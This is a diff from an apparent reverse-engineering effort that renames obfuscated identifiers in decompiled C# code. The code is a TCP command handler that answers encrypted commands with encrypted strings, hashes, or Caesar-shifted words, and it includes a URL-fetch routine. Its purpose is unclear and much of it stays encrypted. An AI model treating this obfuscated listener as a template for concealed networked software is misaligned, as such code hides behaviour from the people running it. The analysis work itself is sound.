@@ -60,7 +60,7 @@ namespace ns0
         if (deobShouldQuit)
           return;
         TcpClient tcpClient = (TcpClient) object_1;
-        StreamWriter streamWriter_0 = new StreamWriter((Stream) tcpClient.GetStream(), Encoding.ASCII);
+        StreamWriter streamWriter = new StreamWriter((Stream) tcpClient.GetStream(), Encoding.ASCII);
         StreamReader streamReader = new StreamReader((Stream) tcpClient.GetStream(), Encoding.ASCII);
         bool flag2 = true;
         while (flag2)
@@ -105,82 +105,82 @@ namespace ns0
               "\x2471㥽\x206C㸃❋㩮㡇ⵅ㑤㉳⭊\x0E60\x0C53ᅗ\x0860ظὬɲ@Ձ᱅ᩧ͖ᘢᑭैၕ\xEE90\xF7B2\xEA84\xE883\xFD91\xE4D0\xE2DAﮛﺴﲇ\xE183\xF891\xF6AC\xEFDB\xF2B6\xF0C4햗체쫳펳욖쒇�삯�쟶��춏풛튖쯻께곶뇺꣢ꛢ뾈ꋓꃚꗨ볳뫕ꏢ뛷득ꧏ냁躴韵諯袷鷂蓧苶鯾黜鳣臕颠雡辸銹郫畄汔樬猣昷搞礱怃縢朮稞砲浜球片欈丬䰂儠䠏䘇弟䈱䁺䔬尔娟䌐噽呮䤊倄\x2E5B㝒⨟⠒㵶⑃≹㭒㹓㱇⅄㠏㘔⽂㉶いᕜ\x0C78੨\x137Bؿрᤩ8ṽݰᨵᡘെᐢቮ\x0B4A\xEED9\xEC8D\xF1B0\xE891\xE6B3ￗ\xE293\xE0DF\xE5CDﲲ揄\xE390\xF69B\xF48C\xE99E\xF09A캶힛쪽좭�쒖신\xDB8C\xDE9A�쇶�회쾛튷키뗵곊ꫭ돰ꛫꓮ맔ꂙ뻊Ꞑ뫯룿귏뒁니ꮟ軫賲醯製蛼\x9FF5苃背藧鳖髃菒雦铏觺郦湌眜樬栖紗搌戭笐繎簝愯砷瘕漥牅瀜唞䰠䩳匷䘐䐣夐䀍幧䜐娏堢䴍吧刑䬼\x2E43ⱔㅒ⠛☜㼁≰\x2065╚㱒㨄⍥㙷㑸⤖だแᝑਜ਼ࡄᵛѬɣ᭘ṑ᱖Ūᠨᙉསችၰ\xF59F\xEC85\xEA94\xF386\xE683\xE4B9戀\xE081ﺔ\xE78E歹\xF8B9\xED87\xF491\xF29A\xEB9F캼첤토좧욧�슣삫얶��쎶횰풼즾킱껑럷\xAAC5\xA8C9뷖\xA4CDꋝ믝뻓볐ꇲ뢖뚕꾆닂냘闷賠諴鏦蛣蓧駻胧麱螮髨飰跡铵鋲讬渋氓焗栟昇缙戏恍攇簐稞挆瘙琔楎瀜丢圳䨣䠵崣䐰䉯嬹帶尥䅦堷嘯佨刷倳㕓ⱀ⩗㌔♒⑇㥛⁒㹖❆㩜㡜ⵎ㐔\x325E⬌\x0E60౮ᄶ\x086F٥άɶlհᱹᩧͫᘶᑼॼၱ\xEEC3\xF795\xEA86\xE887ﶓ\xE490\xE28Eﮌﺓﲞ\xE1A5\xF88C\xF694\xEFA6\xF2D2\xF099햼첥쪯펱욤쓩�삵�잲��춯풼튋쯮꺎겛뇒ꣁꛊ뿋ꊂꂁꗖ볉뫘ꏏ뛙듖ꧢ낐軷韱說裱鷩蓽苣鯽黰鳰膦飡雯迡鋠部甑氉樔獔昇摉祒怎縖朄稔砜洦瑔爆欁丫䰳儳䠂䙫彶䈣䀿䔧尸娹䌥嘁呹䤷倾⹂㝀⩇⡊㵙␄≖㭈㹗㱃\x2153㡛㙞⽛㈒すᕻ౭ੴጴتѱ\x197Blṣݭ᩵ᡶപᑱቭୣ\xEE83\xECC1\xF191\xE886\xE682ﾌ\xE296\xE088\xE585ﳜ搜\xE388\xF69F\xF49D\xE98F\xF095캷힣쫪좶�쓤슼\xDBB9\xDEB0�솮�횯쾺튳킰뗁게\xAAD3돕Ꚇ\xA4CD맛ꃍ뻚\xA7C1몚룐귘듕니ꯀ軯賬醶裭蛧\x9FF1苠胢藏鲼骹菠雿铸觽邰渗眙橊桉紎搅戊笚縛簕慆砗瘏潈爀瀘唶䰾䨦匼䙦䐽夷䁠帶䜫娻堸䵪吻别䭬\x2E4Bⱅㅙ⡋☋㽝≐⁂╁㰜㩄⍐㙟㐙⥀さ\x0E77ᝤ\x0A63\x0877ᵭѡɽᬼṧᱽŲᡶᙾཫቷၯ\xF5D2\xEC88\xEA86\xF39C\xE6C6\xE49D聯\xE0C0ﺗ\xE78E望\xF89D\xED8F\xF496\xF2DF\xEB9F캫첷톳좡욣�슰삨얠��쏤횳풱즚탰꺍럞\xAACFꣀ뷉ꒄꋋ믝뻖벑ꇒ룑뚛꿌닗냉闳賯諮鏠蛵蓠駶胰黼蟳骺飡跹铻鋲讬渋氉焂案昘缙戕恍敎簙稛挆瘟琍椏瀀丮圿䨉䠱崵䐊䉯嬸帻尽䄪堹嘸佨剾倮㕇ⱞ⩎㍂☆\x244C㥖⁔㸓❄㩓㡔ⵙ㐔\x324B⭙\x0E61౪ᅹ\x0867هἸɯ\x007Fիᱺᨷͽᙢᑰॼၥ\xEE80\xF795\xEA99\xE8C5ﶟ\xE488\xE286ﮞﺑﲼ\xE1C6\xF8D6\xF690\xEF84\xF287\xF09F헲첢쪮폴욵쒽�삫�잩��춾풺튺쮺껋겁뇏\xA8DDꛉ뾘ꋆꃃꗃ벜뫚ꏅ뛆듊ꦎ냔軭韵諹袥鷵蓰芯鯯黪鳴臵飼雵迩鋺邽甁氉樔猁晆搝礟怈縇杀稟砇洋球爓欍丣䱡儾䠼䘢弯䉢䀩䔧尨娴䌡",
               "뢍궓듵님ꮙ軏貳釯裊蛆\x9FD9苵肿薻鳞髤莽雴铑觹邢渢眖樫栭紻搃戟笴縿簂愶砟瘉潛爰瀎啫䰹䨣匲䘇䐝夸䁷帚䜉娛堔䴠向刞䬯\x2E66ⱖㅕ⡩☘㽺≁⁉╻㱊㩶⍓㘄㑓⥬し\x0E71ᝢਖ਼\x0870ᴨѴɀ᭻Ṷ᰾ńᡰᘰཆቘၜ\xF5AB\xECDA\xEAD2\xF3DB\xE685\xE4A8列\xE092ﺣ\xE7B1揄\xF88F\xED8C\xF4CD\xF2B1\xEBC3캂첔톡좀욼�싵삋얲��쎋횐퓡짷킇꺒럔\xAAC8꣮붏\xA4C9ꋮ뮅뻍볲ꇟ룜뛏꿿닆냎闢賸諬鏻蛯蓌馯胄黤蟐髛飐跲铕鋍诅港氠焴栥昪缼戣怂敛籓稜挶癇琬椇瀼丈圂䨰䠀崬䐣䈶嬖幬尀䄞堍嘣伊刕倔㔇ⱥ⩏㍼♂\x245E㥆\x2067㹒❇㩩㡿ⵯ㐌㉭⭫\x0E60ౌᅿ࡙ٙὁɐCՐᱞᩕ͂ᙒᑛ०ၙ\xEEB1\xF7B5\xEAAE\xE8ACﶫ\xE4A5\xE2AE﮽ﺿﲰ\xE1A7\xF8B5\xF6BA\xEFAA\xF2B8\xF0B4햓첏쪀펅욱쒈�삍�잁��춛풑튝쮎껯곙놙꣎ꛌ뿺ꋤꃼꗕ볽뫴ꏡ뛷듸ꧯ냱軂韑請裄鷛蓅苎鯝黏鳐臄飝雊迉鋐郘産氭樥猱昑搮礿怱繋杏稓砡洙球爅欿且䰩儓䠩䘜异䈗䀃䔄導婥䌑嘼吓䤶倀⸚㝛⩐⡳㵿\x246A≖㭷㹏㱚Ⅵ㡯㙸⼐㉡ねᕇ\x0C4F੯\x135CٲѪ\x1977RṪ݆ᩍᡐ൩ᑧቷୋ\xEE9E\xECB4\xF18C\xE8AD\xE684ﾩ\xE288\xE0B8\xE5B0ﲟ搜\xE383\xF6A7\xF4A0\xE9BC\xF0BA캀힖쪈좃�쒁슇\xDB99\xDEB7�솁�횊쾍튔킌뗅곭ꫤ돱ꛧꓨ맮ꃹ뻢\xA7E2뫿룖귍듶닺ꯡ軏賃釓裙蛬\x9FD9苆胈藃鳝髆菧雐铘觋邿渳眱樠栠紻搧戧笥縯簳愣砵瘜漩爳瀼唓䰍䨆匕䘇䐈够䀁帒䜁娛堐䴛吕初䬯\x2E6FⱠㅷ⡩♺㽰≣⁼┚㰓㩵⍡㙎㑸⥬ふ\x0E6Bᝑੋࡀᵈхɋ᭳Ṏ᱐ĵᡞᙚཋቀၜ\xF5B3\xEC9B\xEAC8\xF386\xE681\xE4AA例\xE08Fﺔ\xE7A3缾\xF89A\xED8D\xF4B7\xF2B4\xEB83캩첂톝좧욬�슉삢얥��쎫횱풚즅킿껄럳ꫡ\xA8CA뷝ꓧꋤ믓뻙볲ꇭ룗뛜꿫당냒闵賏諌鏻蛡蓊駕胯黴蟃髑飢跋铐鋓诿渙氢焺栟昜缻戨怎攳簿稻指瘧琻椨瀓丂園䨎䠔崭䐅䈋嬑帏尐䄂堚嘬佺剽倯㕕Ɐ⩬㍛♁\x246A㥵⁏㹔❣㩱㡚ⵍ㑷㉴⭃\x0E69ూᅝ\x086Bټ\x1F5Aɋjյᱞ\x1A5F͑ᙱᑛॉၳ\xEE84\xF7B2\xEAAD\xE8B0ﶫ\xE4A6\xE2AAﮭﺿﲳ\xE1A3\xF8A9\xF6BA\xEFAA\xF2B4\xF0AC향첍쪃펙욱쒈�삑�잁��춭풕튛쮁껙고뇵꣡ꛌ뿹ꋡꃤꗅ볽뫴ꏭ뛑듸ꧭ냹軤韑諉裌鷛蓅苋鯞黩鲣膩飜雚迉鋛郟申氿樦猱昷搨礼怡縔朲稰砯洁琧爮欭丏䱵兹䠢䙲彷䈥䀤䔄尴娴䌥嘳吉䤫倽\x2E4A㝼⩍⡄㵌\x2451∏㭛㹟㱇\x2153㠘㘕⼆㈜〝ᕠ\x0C75੨\x137Aٿѿᥰiṽܠᩨ\x187Aപᑸቱ\x0B76\xEECE\xEC87\xF187\xE889\xE685ﾂ\xE298\xE08F\xE592ﳜ朗\xE396\xF683\xF49E\xE98C\xF089캱힢쪯좧�쒡슼\xDBA5\xDEB1�솿�횩쾭튰킸뗁곃\xAAC8돳ꛟꓛ만ꃅ뻑\xA7D7뫛룇귞듧닋ꯍ軻賰釹裄蛹\x9FF9苧胝藶鳲髾菬雯铼触郤渗眃樏树紗搋戌筒縊簗愉砋瘔漚爑瀔唿䱱䨨匣䘉䐈奦䁯幼䜡婢堣䴬吖刹䬤\x2E62Ⰾㅲ⡹♢㽍≡⁚╡㱪㩝⍅㙼㑮⥺け๋\x175E\x0A79ࡒᵔѾ"
             };
-            string lower = deobInputString.ToLower();
-            if (lower.StartsWith("鋝词渃汊焒"))
-              this.method_5(streamWriter_0, "ୃ\xEEBD\xECA9\xF181\xE8DA\xE6ADﾹ\xE280\xE08B\xE5A6ﲽ視\xE3CF\xF6B7\xF4BE\xE9AF\xF0C4캡힓쪋좰�");
-            else if (lower.StartsWith("꿠답냲"))
-              this.method_5(streamWriter_0, this.string_3);
-            else if (lower.StartsWith("䐙备䀇布"))
-            {
+            string deobGivenCommand = deobInputString.ToLower();
+            if (deobGivenCommand.StartsWith("鋝词渃汊焒"))
+              this.deobWriteLine(streamWriter, "ୃ\xEEBD\xECA9\xF181\xE8DA\xE6ADﾹ\xE280\xE08B\xE5A6ﲽ視\xE3CF\xF6B7\xF4BE\xE9AF\xF0C4캡힓쪋좰�");
+            else if (deobGivenCommand.StartsWith("꿠답냲"))
+              this.deobWriteLine(streamWriter, this.string_3);
+            else if (deobGivenCommand.StartsWith("TEST")) //䐙备䀇布
+                        {
               MD5 md5_0 = MD5.Create();
               SHA1 sha1_0 = SHA1.Create();
               SHA256 sha256_0 = SHA256.Create();
-              int index = deobController.smethod_6(0, strArray1.Length);
-              string string_4 = index % 3 != 0 ? (index % 3 != 1 ? deobController.smethod_3(md5_0, strArray1[index]) : deobController.smethod_5(sha256_0, strArray1[index])) : deobController.smethod_4(sha1_0, strArray1[index]);
-              this.method_5(streamWriter_0, string_4);
+              int deobRandomInt = deobController.deobRandomNumber(0, strArray1.Length);
+              string deobHashOutput = deobRandomInt % 3 != 0 ? (deobRandomInt % 3 != 1 ? deobController.deobMD5String(md5_0, strArray1[deobRandomInt]) : deobController.deobSHA256String(sha256_0, strArray1[deobRandomInt])) : deobController.deobSHA1String(sha1_0, strArray1[deobRandomInt]);
+              this.deobWriteLine(streamWriter, deobHashOutput);
             }
-            else if (lower.StartsWith("\xECC1\xF1BE\xE8A7\xE6BB\xFFD8\xE2A1\xE0BA\xE5C2"))
-              this.method_5(streamWriter_0, "向刌䬅⸎Ⱳㅳ⡹♨㽠≷\x2063╱㱲㨗⍬㙦㑱⤎と๚");
-            else if (lower.StartsWith("崎䑱䉽嬏帆尕䄫"))
+            else if (deobGivenCommand.StartsWith("\xECC1\xF1BE\xE8A7\xE6BB\xFFD8\xE2A1\xE0BA\xE5C2"))
+              this.deobWriteLine(streamWriter, "向刌䬅⸎Ⱳㅳ⡹♨㽠≷\x2063╱㱲㨗⍬㙦㑱⤎と๚");
+            else if (deobGivenCommand.StartsWith("崎䑱䉽嬏帆尕䄫"))
             {
-              int index = deobController.smethod_6(0, strArray3.Length);
+              int index = deobController.deobRandomNumber(0, strArray3.Length);
               string string_4 = strArray3[index];
-              this.method_5(streamWriter_0, string_4);
+              this.deobWriteLine(streamWriter, string_4);
             }
-            else if (lower.StartsWith("ቱ୭\xEE9D\xEC94\xF199\xE880\xE69F\xFFD8"))
+            else if (deobGivenCommand.StartsWith("ቱ୭\xEE9D\xEC94\xF199\xE880\xE69F\xFFD8"))
             {
-              int index = deobController.smethod_6(0, strArray4.Length);
+              int index = deobController.deobRandomNumber(0, strArray4.Length);
               string string_4 = strArray4[index];
-              this.method_5(streamWriter_0, string_4);
+              this.deobWriteLine(streamWriter, string_4);
             }
-            else if (lower.StartsWith("琉椂瀽丩圣䨁䠂"))
+            else if (deobGivenCommand.StartsWith("琉椂瀽丩圣䨁䠂"))
             {
               string str2 = "ᡟᙾཬቜ၊\xF5C3\xEC9F\xEA8C\xF398\xE6B6\xE4AD領\xE092ﺄ\xE7B3廙\xF88D\xED9D\xF4C5\xF2AE\xEBC7캌첖톞좀욌";
               string string_6 = this.method_3(str2);
-              string string_4 = this.method_4(deobController.smethod_1(), str2, string_6);
-              this.method_5(streamWriter_0, string_4);
+              string string_4 = this.method_4(deobController.deobGetRandomThingOf5(), str2, string_6);
+              this.deobWriteLine(streamWriter, string_4);
             }
-            else if (lower.StartsWith("蓫馩胁黔螫髴飓跋银"))
+            else if (deobGivenCommand.StartsWith("KEEPALIVE")) //
             {
-              string string_4 = deobController.smethod_0(deobController.smethod_2(), deobController.smethod_6(0, 24));
-              this.method_5(streamWriter_0, string_4);
+              string deobOutputString = deobController.deobCaesar(deobController.deobGetRandomFruit(), deobController.deobRandomNumber(0, 24));
+              this.deobWriteLine(streamWriter, deobOutputString);
             }
-            else if (lower.StartsWith("ᙊ\x0F6Fቪု"))
-              this.method_5(streamWriter_0, "裻蛅\x9FF1芻背藃鳯髣菊雷铘觽郑渔睟樝栌紣搲戁笿縶簆慔砌瘬漧爕瀋唠䱣䨳匰䙱䐈天䁳帆䝯娸塣䴌吕刲䭧⹁Ⰺ");
-            else if (lower.StartsWith("華\xE3C4\xF6A2\xF4AE"))
+            else if (deobGivenCommand.StartsWith("ᙊ\x0F6Fቪု"))
+              this.deobWriteLine(streamWriter, "裻蛅\x9FF1芻背藃鳯髣菊雷铘觽郑渔睟樝栌紣搲戁笿縶簆慔砌瘬漧爕瀋唠䱣䨳匰䙱䐈天䁳帆䝯娸塣䴌吕刲䭧⹁Ⰺ");
+            else if (deobGivenCommand.StartsWith("華\xE3C4\xF6A2\xF4AE"))
             {
               string string1 = this.string_1;
               string string2 = this.string_2;
-              this.method_5(streamWriter_0, string1 + "᭄" + string2);
+              this.deobWriteLine(streamWriter, string1 + "᭄" + string2);
             }
-            else if (lower.StartsWith("럢ꫣ꣪뷢"))
-              this.method_5(streamWriter_0, "풐즋탰꺏럸\xAAF8꣬뷢ꓪꋿ믵뺞복ꇴ룴뚛꿠답냲闊賀諕鏌蛂蓛駊肠黒蟐髙飘跓铃鋍诉渶汁焦栿昢罘戥怿收簫稥挰瘳琡楎瀷丗團䨒䠆崐䐑䉯孰帍將䄁堋噻");
-            else if (lower.StartsWith("㝼⩨⠅㵰\x2473"))
-              this.method_5(streamWriter_0, "\xFADA\xF8B0\xEDA3\xF4BC\xF2B9\xEBCC캚첕톘좑욎�슊샭얆��쎂횓풏즚킝껫럿ꪊ꣬뷽ꓬꋶ믰뻻볳ꆆ룴뛱꿼늒낑闊賘諓鎴蛐蓆駌");
-            else if (lower.StartsWith("伜刀倘㔒ⱨ"))
-              this.method_5(streamWriter_0, "㑳⥡ぽไᝄ੍ࡕᴺшɊ᭄Ṓᰱłᡑᙞམቊၞ\xF5A1\xECA8");
-            else if (lower.StartsWith("吘刋䬍\x2E6F"))
+            else if (deobGivenCommand.StartsWith("럢ꫣ꣪뷢"))
+              this.deobWriteLine(streamWriter, "풐즋탰꺏럸\xAAF8꣬뷢ꓪꋿ믵뺞복ꇴ룴뚛꿠답냲闊賀諕鏌蛂蓛駊肠黒蟐髙飘跓铃鋍诉渶汁焦栿昢罘戥怿收簫稥挰瘳琡楎瀷丗團䨒䠆崐䐑䉯孰帍將䄁堋噻");
+            else if (deobGivenCommand.StartsWith("㝼⩨⠅㵰\x2473"))
+              this.deobWriteLine(streamWriter, "\xFADA\xF8B0\xEDA3\xF4BC\xF2B9\xEBCC캚첕톘좑욎�슊샭얆��쎂횓풏즚킝껫럿ꪊ꣬뷽ꓬꋶ믰뻻볳ꆆ룴뛱꿼늒낑闊賘諓鎴蛐蓆駌");
+            else if (deobGivenCommand.StartsWith("伜刀倘㔒ⱨ"))
+              this.deobWriteLine(streamWriter, "㑳⥡ぽไᝄ੍ࡕᴺшɊ᭄Ṓᰱłᡑᙞམቊၞ\xF5A1\xECA8");
+            else if (deobGivenCommand.StartsWith("吘刋䬍\x2E6F"))
             {
-              int index = deobController.smethod_6(0, strArray2.Length);
-              string string_4 = deobController.smethod_3(MD5.Create(), strArray2[index]);
-              this.method_5(streamWriter_0, string_4);
+              int index = deobController.deobRandomNumber(0, strArray2.Length);
+              string string_4 = deobController.deobMD5String(MD5.Create(), strArray2[index]);
+              this.deobWriteLine(streamWriter, string_4);
             }
             else
             {
-              if (lower.StartsWith("\xECA5\xEA93\xF3B3\xE690"))
+              if (deobGivenCommand.StartsWith("\xECA5\xEA93\xF3B3\xE690"))
               {
                 deobShouldQuit = true;
-                streamWriter_0.WriteLine("≣㭦㸞㱷Ⅳ㡾㙩⼈");
-                streamWriter_0.Flush();
+                streamWriter.WriteLine("≣㭦㸞㱷Ⅳ㡾㙩⼈");
+                streamWriter.Flush();
                 tcpClient.Close();
                 break;
               }
-              this.method_5(streamWriter_0, "");
+              this.deobWriteLine(streamWriter, "");
             }
           }
           catch (Exception ex)
           {
-            streamWriter_0.WriteLine("栩");
+            streamWriter.WriteLine("栩");
           }
         }
       }
@@ -189,59 +189,59 @@ namespace ns0
       }
     }
 
-    public string method_2(string string_4)
+    public string deobWebGet(string deobStringInput)
     {
       StringBuilder stringBuilder = new StringBuilder();
-      byte[] numArray = new byte[100000];
-      Stream responseStream = WebRequest.Create(string_4).GetResponse().GetResponseStream();
+      byte[] deob100K = new byte[100000];
+      Stream responseStream = WebRequest.Create(deobStringInput).GetResponse().GetResponseStream();
       int num;
       do
       {
-        num = responseStream.Read(numArray, 0, numArray.Length);
+        num = responseStream.Read(deob100K, 0, deob100K.Length);
         if (num != 0)
-          goto label_2;
-label_1:
+          goto deobBase64String;
+deobContinue:
         continue;
-label_2:
-        string base64String = Convert.ToBase64String(numArray);
+deobBase64String:
+        string base64String = Convert.ToBase64String(deob100K);
         stringBuilder.Append(base64String);
-        goto label_1;
+        goto deobContinue;
       }
-      while (num > 0);
+      while (num > 0); //what?
       return stringBuilder.ToString();
     }
 
-    public static string smethod_0(string string_4, int int_0)
+    public static string deobCaesar(string deobInput, int deobInputNum)
     {
-      string_4 = string_4.ToLower();
-      int num1 = int_0;
-      if (num1 < 0)
-        num1 += 26;
+      deobInput = deobInput.ToLower();
+      int deobRotations = deobInputNum;
+      if (deobRotations < 0)
+        deobRotations += 26;
       string str = "";
-      for (int startIndex = 0; startIndex < string_4.Length; ++startIndex)
+      for (int startIndex = 0; startIndex < deobInput.Length; ++startIndex)
       {
-        char ch = string_4.Substring(startIndex, 1)[0];
+        char ch = deobInput.Substring(startIndex, 1)[0];
         int num2 = (int) ch - 97;
-        int num3 = (num2 < 0 ? 1 : (num2 >= 26 ? 1 : 0)) != 0 ? (int) ch : (num2 + num1) % 26 + 65;
+        int num3 = (num2 < 0 ? 1 : (num2 >= 26 ? 1 : 0)) != 0 ? (int) ch : (num2 + deobRotations) % 26 + 65;
         str += (string) (object) (char) num3;
       }
       return str;
     }
 
-    public string method_3(string string_4)
+    public string method_3(string deobInput)
     {
       string str;
-      if (string_4 == null)
+      if (deobInput == null)
       {
         str = "";
       }
       else
       {
-        char[] charArray = string_4.ToCharArray();
+        char[] charArray = deobInput.ToCharArray();
         for (int index1 = 0; index1 < 100; ++index1)
         {
-          int index2 = deobController.smethod_6(0, string_4.Length);
-          int index3 = deobController.smethod_6(0, string_4.Length);
+          int index2 = deobController.deobRandomNumber(0, deobInput.Length);
+          int index3 = deobController.deobRandomNumber(0, deobInput.Length);
           char ch = charArray[index2];
           charArray[index2] = charArray[index3];
           charArray[index3] = ch;
@@ -251,7 +251,7 @@ label_2:
       return str;
     }
 
-    public static string smethod_1()
+    public static string deobGetRandomThingOf5()
     {
       ArrayList arrayList = new ArrayList();
       arrayList.Add((object) "ﺶﳑ\xE1AF\xF8AB\xF6A9\xEFBC\xF2A2\xF0AB햓쳬쪐펂요쒙�삘�쟠��춎풜틿쮕껶겁뇥꣭\xA6FC뿾ꊂꃣꗣ볯뫮ꏾ뛮듲ꧫ냦軂鞰諞裂鷟蓅芯鯘黗鳅臈飀雁这銲郅申氺樳猶晆摇礪怲縶木稻砥洧瑔爲欠三䰙儛䡨䘈引䉢䀞䔖小娚䌜嘒吞䤞倁\x2E79㝢⨊⡭㵮\x246D≶㭵㹺㱳℆㡱㙸⽼㉾〝ᕁ\x0C5Eੈጴمчᥚ ṋ݄ᩙᡍോᑟቓବ\xEEA6\xECBB\xF1B5\xE8AD\xE6AEﾱ\xE2B2\xE0CD\xE5CBﲯ瘝\xE3AB\xF6A5\xF4D1\xE9CE\xF0A4캀힝쪍좂�쒗싢\xDB96\xDE84�솇�횒쾚튂킎떒곿ꫢ돬ꛠꓸ맦ꃲ뻫\xA7E4뫢룦궊등닳ꯩ躮賆釒裎蚫鿑苕胜藚鳏髅菞雓铑觋郆湃眠樭");
@@ -259,12 +259,12 @@ label_2:
       arrayList.Add((object) "㕆ⱦ⩩㍇♅\x2468㥜⁂㹕\x2778㩻㡿\x2D7B㑘㉬⭃๚ౙᅀ\x0879١\x1F5Aɵ}ԩᰯᨠͦᙿᑗॠၱ\xEE93\xF7B1\xEAC5\xE8D7ﶙ\xE496\xE2DFﮌﻎﲦ\xE1A9\xF889\xF6B9\xEFA9\xF281\xF0C4헥쳿쫴펤운쓰�삵�쟴��춹풣튪쮹꺗곷뇒꣹ꛚ뿽ꋉꂛꗣ볛뫅ꏰ뛐뒏ꦜ낂軋韧誻裳鶱蒷苖鯶黵鳴臇飁隭迄銹邲甽氶樑猾昰搨礉怘縸杏稙破洦瑛爻欹丆䱶兽䠜䘯弉䈲䀟䔺尫婼䌩噡呠䥸倥\x2E74㝆⨒⠔㵸\x2466≨㭸㸑㱧ⅾ㡗㙒⼞㉰はᕈ౯ੌጻ٪ѹᥜLṺݸᩔᡤ\x0D4Fᑕች\x0B5A\xEEAF\xECA0\xF18C\xE8AA\xE6A6ﾹ\xE295\xE0DE\xE5BAﲹ視\xE383\xF69A\xF49F\xE988\xF0B1캋힢쪚좢�쒦승\xDBBA\xDEA8�쇲�훴쾌튓킾뗱곭ꪕ뎟ꛉꓨ릊ꂗ뻹\xA7E1뫣룓귫듼닾ꯏ軆賶針裇蛬\x9FEE苤胫藃鳅骠菶集钪觩邨渡眽樟栔紎搔扞笸縿簩慉砕瘉漦爰瀏唔䰿䨷匘䘿䐋天䁱帣䜐娫堣䴞呿刚䬽\x2E6AⰕㅕ⡠☚㽌≭\x2078╓㱎㩖⌔㘁㐒⤝づ\x0E62\x175E੬ࡄᵖЫɧᬥḧ᱒ťᡚᙚཟሹ၍\xF5DD\xEC94\xEAAF\xF383\xE6D4\xE49F留\xE0A8ﺄ\xE7D3頻\xF8B1\xED9F\xF4B0\xF2AA\xEBA4캭첓톅좊욈�슚삻얃��쎦훹풼즅킷꺕랄ꪜꣷ붊\xA4CBꊛ믩뻶볕ꇮ룂뛉꿽닠냸闈賯諲鏌蛶蓼駏胫黉蟍骣飹跺铼鋒设温氎焧栩昘缻戣恙敖簸穃挥瘑琽椯瀇乨圑䨅䠄嵮䐯䈀嬻常屾䅭堙嘔佸刂偶㕳Ⱎ⩒㍵☒\x247C㥿\x2061㸁❧㩻㡆ⵆ㑰㉦⭠๏\x0C52ᄡࡌْὝɤL\x0560ᰫᩖ̯ᙙᑘॗၶ\xEEA2\xF792\xEA90\xE8A4\xFDCE\xE4D3\xE2BBﮝﺸﲖ\xE192\xF88A\xF6D4\xEFC3\xF28B\xF09B햰첚쪩펽웰쒺�삐�잚��춸퓻튘쯻껶곧뇽\xA8C7ꛪ뾀ꊛꃄꖍ볟뫝ꎒ뛇듮ꧡ냸軁韠課袴鶫蓨苁鯙黕鲤臁飈雾迋鋥邭町氠樤猝昰摑礪恋繀朲稠砃洭琀爼欄不䰰儴䠠䘽弝䈃䀫䔖射娙䌀嘱吣䥷倵\x2E67㝹⩫⡨㵏\x246C≗㭑㸎㱕\x2155㡉㙣⽏㉾ぉᕵ\x0C3Bਲ਼\x1376هќ\x196ERṖ݈ᨫᠧിᑗቬ\x0B4A\xEE9C\xECD7\xF1CE\xE8B1\xE6B9ﾩ\xE2B3\xE09E\xE5A4ﲶ節\xE3B6\xF6A3\xF49B\xE9A7\xF0BB캩\xD7A4쪒죪�쓴슗\xDBB1\xDE99�솋�훰쾉튠킎뗳겇ꫂ돱ꛀꓨ말ꂗ뻧\xA7E8뫻");
       arrayList.Add((object) "ﺚ\xE795愈\xF893\xED81\xF497\xF29E\xEBA6캺첮톸좦욼�슦삨얩��쎪횹풪즣킱껧럕\xAAC4\xA8CC뷈꓅ꋛ믟뻛볿ꇟ룊뛉꿍닐냍闡賭諕鏠蛧蓡駩胡黽蟡髴飴跨钺鋘诅渼氷焰案昢缱戱怨敂簮稥挢瘾琮椥瀵乣土䨁䡥崗䐍䈛嬞帓山䄓堚嘞伛刀候㔒ⱼ⩽㍠♵\x247F㥭 㹶❳㩶㡯ⴊ㑥㉱⭾ฮభᅗࡁمὟȢ^Ոᱏᩐ͍ᙘᐹ⥚ဉ\xEEA6\xF7BF\xEAAD\xE8C5ﶻ\xE4A6\xE2B6ﯜﺸﲶ\xE1C6\xF8BF\xF6AD\xEFC8\xF2B7\xF0A8햔첁쫧펆욓쓩�삅�잗��춁풁튋쯬껥곥뇵꣰\xA6FB뿶ꋴꂍꗥ볮뫢ꏲ뛥듰ꧽ냪躣韈諘裒鷌蓆芯鮲黙鳇膦飝雎迎鋟邽画水樥猠昬携礨恀縦朧穚砰洩琤爺歌丅䰎其䠜䘒弍䈏䀞䕢尞娟䌊噶吊䤜倅\x2E6F㝾⩸⠅㵯\x2476≠㭥㹲㱧Ⅾ㠘㙣⽩㉰ふᕙ\x0C5B\x0A46ጴكћᥐFṒܠᩓᡛ്ᐴቆ\x0B5E\xEEAA\xECC1\xF1AF\xE8BD\xE6A7\xFFD8\xE2A7\xE0AF\xE5ADﲭ𧻓\xE3B1\xF6B1\xF4D9\xE9AA\xF0A6캁힛쪅좃�쒑싯\xDB8D\xDE93�솖�횐쿨튁킋뗵과ꫴ뎔꛴ꒉ맹ꃭ뺓ꟺ뫬뢕궄등답꯶軋賍醶裚蛙鿊芢胊藓鳓髙菈雂钹觝郇渨眥樾桅絔搴戾笮縵簥愧硘瘰漪爻瀮唓䰞䨑匞䘕䐄奾䀅帜䝠娌堄䴜吁刌䭬\x2E6BⱵㅡ⡸♾㽻∂\x206C│㱬㩧⌄㙾㑲⥯べ๔ᜰ\x0A5FࡗᵕіɍᬼṈ᱗Ńᠸᙚཊቋွ\xF5B9\xECA3\xEAAB\xF3AE\xE6C6\xE4B8聆\xE0B2ﻓ\xE7CC磌\xF8A1\xEDCA\xF4AC\xF2B7\xEBA3캞쳡톀좐욄�싢삁얐��쎖횏풐짮킈껡럽ꫤ꣢뷿ꓠꋬ믫뺞볺ꇧ룷뛮꾈닡냧闕賙誧鏁蛀蓄馾胑黜蟎髖飁趪铙鋏诞渠水焼校晋缩户怫攬簮稱捄瘼琬楎瀶不圖䨝䠒崂䐖䈙孼帗専䄎堊嘙佨剼倓㕤Ɀ⩰㌔♭Ѡ㤧\x2065㹽✀㩽㡼\x2D6B㑰㉶⭩๘ెᅝࡏث\x1F5CɇBԢ\x1C4Bᩜ͒ᙑᑟ॔၃\xEEB7\xF7A5\xEAA9\xE8B3ﶲ\xE4C4\xE2A6﮲ﺹﳑ\xE1A8\xF8A2\xF6DB\xEFBA\xF2BB\xF0A7햔첉쪎펇욞쒝�샠�\xE789��춙풑틿쮟껧겁뇳꣫ꛦ뿢ꋲꃨꗨ벜뫰ꏭ뛯듯ꧼ냷軅韙諐裄鷟蒤苆鯟黔鲱臟飁雒迚鋚郔甸汌樵猼昭摉礭怩縪䝀穩硕洬琱爼欻丄䱡儝䠝䘟彸䈚䀏䔏将娔䌝嘟合䤜倛⸃");
